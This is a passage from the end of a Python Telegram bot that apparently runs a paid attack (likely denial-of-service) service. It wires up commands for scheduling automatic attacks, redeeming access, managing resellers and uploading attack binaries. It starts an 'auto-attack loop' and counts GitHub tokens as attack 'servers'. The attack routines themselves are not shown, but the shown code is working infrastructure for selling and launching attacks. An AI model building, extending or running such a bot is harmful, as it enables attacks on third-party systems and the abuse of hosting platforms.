            "┌────────────────────────────────┐\n"
            "│  ᴜꜱᴇ ʙᴜᴛᴛᴏɴꜱ ᴛᴏ ᴄᴏɴᴛɪɴᴜᴇ:   │\n"
            "└────────────────────────────────┘",
            reply_markup=reply_markup
        )

    except Exception as e:
        await progress_msg.edit_text(
            "╔════════════════════════════════╗\n"
            "║  ❌  ᴇʀʀᴏʀ                    ║\n"
            "╚════════════════════════════════╝\n"
            "┌────────────────────────────────┐\n"
            f"│  {str(e)[:28]} │\n"
            "└────────────────────────────────┘"
        )

async def global_error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    logger.exception("Unhandled bot error", exc_info=context.error)
    try:
        if isinstance(update, Update) and update.effective_message:
            await update.effective_message.reply_text("⚠️ Something went wrong. Please try again later.")
    except Exception:
        logger.exception("Could not send error response")


def main():
    """Initialize and run the bot"""
    if not BOT_TOKEN:
        raise RuntimeError("BOT_TOKEN environment variable is required")

    async def _post_init(application):
        global AUTO_ATTACK_LOOP_TASK, AUTO_ATTACK_BOT
        AUTO_ATTACK_BOT = application.bot
        if AUTO_ATTACK_LOOP_TASK is None or AUTO_ATTACK_LOOP_TASK.done():
            AUTO_ATTACK_LOOP_TASK = asyncio.create_task(auto_attack_loop())
            logger.info("💀 Auto-attack loop scheduled")

    async def _post_shutdown(application):
        global AUTO_ATTACK_LOOP_TASK
        if AUTO_ATTACK_LOOP_TASK and not AUTO_ATTACK_LOOP_TASK.done():
            AUTO_ATTACK_LOOP_TASK.cancel()
            try:
                await AUTO_ATTACK_LOOP_TASK
            except asyncio.CancelledError:
                pass
            logger.info("🛑 Auto-attack loop stopped")

    application = (
        Application.builder()
        .token(BOT_TOKEN)
        .post_init(_post_init)
        .post_shutdown(_post_shutdown)
        .build()
    )
    application.add_error_handler(global_error_handler)

    # Button callback handler for inline keyboards
    application.add_handler(CallbackQueryHandler(button_callback))

    # Start and safe informational commands.
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", lambda update, context: help_handler(update, update.effective_user.id)))
    application.add_handler(CommandHandler("status", lambda update, context: check_status(update, update.effective_user.id)))
    application.add_handler(CommandHandler("access", lambda update, context: my_access(update, update.effective_user.id)))
    application.add_handler(CommandHandler("redeem", redeem_command))

    # ─── AUTO ATTACK COMMANDS ───
    application.add_handler(CommandHandler("autovc", autovc_command))
    application.add_handler(CommandHandler("autotime", autotime_command))
    application.add_handler(CommandHandler("autoattacks", autoattacks_command))
    application.add_handler(CommandHandler("autostatus", autostatus_command))
    application.add_handler(CommandHandler("removeauto", removeauto_command))
    application.add_handler(CommandHandler("stopauto", stopauto_command))
    application.add_handler(CommandHandler("startauto", startauto_command))

    # File handler for binary upload
    application.add_handler(MessageHandler(filters.Document.ALL, handle_binary_file))

    # Text message handler for all button presses and text input
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_button_press))

    # Display startup information
    primary_owners = [uid for uid, info in owners.items() if info.get('is_primary', False)]
    secondary_owners = [uid for uid, info in owners.items() if not info.get('is_primary', False)]

    print("╔════════════════════════════════╗")
    print("║  🤖  ʙᴏᴛ ɪꜱ ʀᴜɴɴɪɴɢ...      ║")
    print("╚════════════════════════════════╝")
    print("┌────────────────────────────────┐")
    print(f"│  👑 ᴘʀɪᴍᴀʀʏ ᴏᴡɴᴇʀꜱ:  {len(primary_owners):<6}                 │")
    if primary_owners:
        print(f"│     {', '.join(str(uid) for uid in primary_owners[:3])}  │")
    print("├────────────────────────────────┤")
    print(f"│  👑 ꜱᴇᴄᴏɴᴅᴀʀʏ ᴏᴡɴᴇʀꜱ:  {len(secondary_owners):<6}               │")
    if secondary_owners:
        print(f"│     {', '.join(str(uid) for uid in secondary_owners[:3])}  │")
    print("├────────────────────────────────┤")
    print(f"│  📊 ᴀᴘᴘʀᴏᴠᴇᴅ ᴜꜱᴇʀꜱ:  {len(approved_users):<6}               │")
    print(f"│  💰 ʀᴇꜱᴇʟʟᴇʀꜱ:       {len(resellers):<6}               │")
    print(f"│  🔑 ꜱᴇʀᴠᴇʀꜱ:         {len(github_tokens):<6}               │")
    print("├────────────────────────────────┤")
    print(f"│  🔧 ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ:    {'ᴏɴ' if MAINTENANCE_MODE else 'ᴏꜰꜰ':<6}               │")
    print(f"│  ⏳ ᴄᴏᴏʟᴅᴏᴡɴ:        {COOLDOWN_DURATION:>3}ꜱ                │")
    print(f"│  🎯 ᴍᴀx ᴀᴛᴛᴀᴄᴋꜱ:     {MAX_ATTACKS:>3}                 │")
    print("└────────────────────────────────┘")
    print()

    # Start polling
    application.run_polling(close_loop=False)


if __name__ == '__main__':
    main()